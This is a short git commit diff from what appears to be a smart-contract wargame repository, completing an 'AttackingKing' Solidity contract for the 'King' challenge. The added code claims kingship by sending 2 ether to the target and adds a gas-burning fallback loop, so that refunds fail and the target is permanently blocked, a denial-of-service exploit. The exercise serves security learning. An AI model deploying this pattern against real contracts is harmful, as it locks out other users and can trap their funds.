0edf216ad69cc5d24a9a6680a0d068dcc5b5d635
Roman Pavlovskyi <rpavlovskyi@gmail.com>
2022-08-07 16:26:00 -0700

    Completed 5. King

--- contracts/5. King/AttackingKing.sol
+++ contracts/5. King/AttackingKing.sol
@@ -10,7 +10,12 @@ contract AttackingKing {
         contractAddress = _contractAddress;
     }
 
+    fallback() external payable {
+        for (uint256 i = 0; i < 100000000; i++) {}
+    }
+
     function hackContract() external {
-        // Code me!
+        // King victim = King(contractAddress);
+        payable(address(contractAddress)).call{value: 2 ether}("");
     }
 }
